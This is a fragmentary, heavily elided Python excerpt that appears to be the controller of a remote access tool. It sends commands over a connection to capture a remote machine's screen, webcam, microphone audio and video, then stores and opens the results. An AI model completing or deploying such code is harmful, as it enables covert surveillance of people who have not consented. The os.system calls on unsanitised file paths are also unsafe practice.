...
def screenshot(cmd, conn):
	...
	file_Name = dnt.strftime("screenshot_%y%m%d%H%M%S.jpg")
	directory = os.getcwd()
		...
		for file in os.listdir():
			if is_image(file):
				if is_screenshot(file):
					...
					shutil.move(file, directory + "\\screenshot\\")
		
		os.system("\"" + directory + "\\screenshot\\" + file_Name	 + "\"")
...
def camera(cmd, conn):
	...
	dnt = datetime.datetime.now()
	file_Name = dnt.strftime("camera_%y%m%d%H%M%S.jpg")
		...
		for file in os.listdir():
			if is_image(file):
				if is_camera(file):
					...
					shutil.move(file, directory + "\\camera\\")
		
		os.system("\"" + directory + "\\camera\\" + file_Name	 + "\"")
...
def voice_record(cmd,conn):
	dnt = datetime.datetime.now()
	file_Name = dnt.strftime("voicerecord_%y%m%d%H%M%S.wav")
	duration = cmd[10:]
	conn.send(str.encode(cmd))
...
def video_record(cmd,conn):
	dnt = datetime.datetime.now()
	file_Name = dnt.strftime("videorecord_%y%m%d%H%M%S.avi")
	duration = cmd[10:]
	conn.send(str.encode(cmd))
...
def is_camera(file):
	name, ext = os.path.splitext(file)
	return (ext in img) and "camera" in name.lower()
